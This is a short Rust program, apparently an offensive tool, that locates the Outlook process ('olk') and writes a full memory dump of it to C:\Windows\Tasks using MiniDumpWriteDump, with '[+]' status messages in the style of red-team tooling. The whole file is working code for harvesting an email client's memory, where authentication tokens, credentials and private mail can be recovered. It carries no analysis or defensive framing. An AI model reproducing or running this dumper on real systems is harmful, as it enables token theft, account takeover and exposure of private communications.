use std::ptr;

use sysinfo::{System, ProcessExt, SystemExt, PidExt};
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use windows::Win32::Storage::FileSystem::{CreateFileA, FILE_SHARE_MODE, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL};
use windows::Win32::System::Diagnostics::Debug::{MiniDumpNormal, MiniDumpWithFullMemory, MiniDumpWriteDump, MINIDUMP_CALLBACK_INFORMATION, MINIDUMP_EXCEPTION_INFORMATION, MINIDUMP_USER_STREAM_INFORMATION};
use windows::Win32::System::Threading::{OpenProcess, PROCESS_ACCESS_RIGHTS};
use windows::Win32::Foundation::{HANDLE, CloseHandle, GetLastError};
use windows::core::PCSTR;
use windows_strings::s;


fn get_pid() -> u32 {
    let mut sys: System = System::new_all();
    sys.refresh_all();

    let mut pid: u32 = 0;
    for process in sys.processes_by_name("olk") {
        pid = process.pid().as_u32();
    }
    return pid;
}

fn main() {
    println!("[+] Searching for process...");
    let pid: u32 = get_pid(); 
    println!("[+] Found pid {pid}");

    if pid == 0 {
        panic!("[!] Failed to find process!");
    }

    unsafe {
        println!("[+] Opening handle to process...");
        const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
        const PROCESS_VM_OPERATION: u32 = 0x0008;
        const PROCESS_VM_READ: u32 = 0x0010;
        const PROCESS_VM_WRITE: u32 = 0x0020;
        
        let h_proc: HANDLE = OpenProcess(
            PROCESS_ACCESS_RIGHTS(
                PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE
            ),
            false,
            pid).expect("Error opening handle to process");

        const GENERIC_READ: u32 = 0x80000000;
        const GENERIC_WRITE: u32 = 0x40000000;

        let f_name: PCSTR = s!("C:\\Windows\\Tasks\\rustdump.dmp");
        // let mut sa: SECURITY_ATTRIBUTES = SECURITY_ATTRIBUTES::default();
        println!("[+] Creating file...");
        let h_file: HANDLE = CreateFileA(
            f_name,
            GENERIC_WRITE,
            FILE_SHARE_MODE(0),
            Some(ptr::null_mut()),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            Some(HANDLE::default())
        ).unwrap();

        let mini_excep: *const MINIDUMP_EXCEPTION_INFORMATION = std::ptr::null();
        let mini_userstr: *const MINIDUMP_USER_STREAM_INFORMATION = std::ptr::null();
        let mini_cb: *const MINIDUMP_CALLBACK_INFORMATION = std::ptr::null();

        println!("[+] Creating dump...");
        if MiniDumpWriteDump(
            h_proc,
            pid,
            h_file,
            MiniDumpWithFullMemory,
            Some(mini_excep),
            Some(mini_userstr),
            Some(mini_cb)
        ).is_err() {
            let e = GetLastError();
            CloseHandle(h_file).unwrap();
            CloseHandle(h_proc).unwrap();
            panic!("Error creating dump! {:?}", e);
        }
        CloseHandle(h_file).unwrap();
        CloseHandle(h_proc).unwrap();
        println!("[+] Dump file saved to {}", f_name.to_string().unwrap());
    }
}
